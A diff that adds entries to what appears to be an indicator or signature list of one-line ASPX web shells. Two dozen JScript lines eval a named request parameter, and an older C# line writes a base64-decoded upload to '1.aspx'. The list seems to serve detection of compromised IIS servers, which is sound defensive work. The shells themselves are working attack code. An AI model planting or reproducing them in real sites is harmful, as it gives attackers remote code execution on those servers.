@@ -11,3 +11,31 @@ http://f/<Script Language= "C#" Runat= "Server">public void Page_Load(){/*wxbif*
 http://f/<script language="JScript" runat="server">function Page_Load(){eval(Request["Web.Config.aspx@2021"],"unsafe");}</script>
 http://f/<script language="JScript" runat="server">function Page_Load(){eval(Request["dE24MplWcGfz"],"unsafe");}</script>
 http://f/<Script Language= "C#" Runat= "Server">public void Page_Load(){/*blnos*/System.IO.File.WriteAllBytes(Server.MapPath("1.aspx"),System.Convert.FromBase64String(Request.Form["a"].Substring(3)));}</script>
+
+Added from https://gist.github.com/JohnHammond/e3053768a06f1ba115c1efbd3a71103d: 
+ <script language="JScript" runat="server">function Page_Load(){eval(Request["NO9BxmCXw0JE"]
+ <script language="JScript" runat="server">function Page_Load(){eval(Request["orange"]
+ <script language="JScript" runat="server">function Page_Load(){eval(Request["bingo"]
+ <script language="JScript" runat="server">function Page_Load(){eval(Request["error"]
+ <script language="JScript" runat="server">function Page_Load(){eval(Request["Ananas"]
+ <script language="JScript" runat="server">function Page_Load(){eval(Request["7gHQRih3fnam"]
+ <script language="JScript" runat="server">function Page_Load(){eval(Request["coStWhkzUF7n"]
+ <script language="JScript" runat="server">function Page_Load(){eval(Request["E9RyGFIM8h3S"]
+ <script language="JScript" runat="server">function Page_Load(){eval(Request["EiH4yV2WGYgc"]
+ <script language="JScript" runat="server">function Page_Load(){eval(Request["EU2JscRCQnpa"]
+ <script language="JScript" runat="server">function Page_Load(){eval(Request["fCbIUAoHD4Ra"]
+ <script language="JScript" runat="server">function Page_Load(){eval(Request["fdvre6YOy2WI"]
+ <script language="JScript" runat="server">function Page_Load(){eval(Request["GKVWDMrzCtXn"]
+ <script language="JScript" runat="server">function Page_Load(){eval(Request["Hjom79sRZQuM"]
+ <script language="JScript" runat="server">function Page_Load(){eval(Request["iDrUyVPJ8uFH"]
+ <script language="JScript" runat="server">function Page_Load(){eval(Request["IM07una1zNYd"]
+ <script language="JScript" runat="server">function Page_Load(){eval(Request["iOnzSBXdA2FP"]
+ <script language="JScript" runat="server">function Page_Load(){eval(Request["J5IgrSjbYlGq"]
+ <script language="JScript" runat="server">function Page_Load(){eval(Request["JRt9ipAqmSXW"]
+ <script language="JScript" runat="server">function Page_Load(){eval(Request["M95jU7cHdux3"]
+ <script language="JScript" runat="server">function Page_Load(){eval(Request["NVCproEij1Fu"]
+ <script language="JScript" runat="server">function Page_Load(){eval(Request["orange"]
+ <script language="JScript" runat="server">function Page_Load(){eval(Request["VM59yu6U3WhN"]
+ <script language="JScript" runat="server">function Page_Load(){eval(Request["wkCVbHqZmRM2"]
+ <script language="JScript" runat="server">function Page_Load(){eval(Request["ZvDUW9RxAnqu"]
+
